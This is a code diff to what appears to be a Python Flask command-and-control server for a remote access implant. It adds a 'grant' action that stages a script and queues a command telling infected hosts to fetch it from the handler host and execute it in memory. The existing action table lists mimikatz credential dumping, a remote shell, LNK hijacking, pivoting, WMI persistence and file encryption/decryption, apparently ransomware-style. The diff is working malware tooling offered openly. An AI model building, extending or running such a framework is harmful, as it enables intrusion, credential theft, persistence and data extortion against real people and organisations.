@@ -198,6 +198,18 @@ def lnk(id):
     command = f"MemRunPy:http://{handler_host}/download/?file=lnk_hijacking.txt"
     write_command(id,command)
 
+def grant(id):
+    print("+--------------------+")
+    print("|       Grant        |")
+    print("+--------------------+")
+    with open('./commands_templates/grant.py',"r") as file:
+        data = file.read()
+    with open("./uploads/grant.txt","w") as file:
+        file.write(data)
+    command = f"MemRunPy:http://{handler_host}/download/?file=grant.txt"
+    write_command(id,command)
+
+
 def wmi(id):
     print("+--------------------+")
     print("|  Persistence : WMI |")
@@ -274,7 +286,7 @@ global app
 app = Flask(__name__)
 
 global dico_action
-dico_action = {1:mimikatz,2:shell,3:lnk,4:pivote,5:wmi,6:encrypt_d,7:decrypt_d}
+dico_action = {1:mimikatz,2:shell,3:lnk,4:pivote,5:wmi,6:encrypt_d,7:decrypt_d,8:grant}
 
 
 @app.route('/')
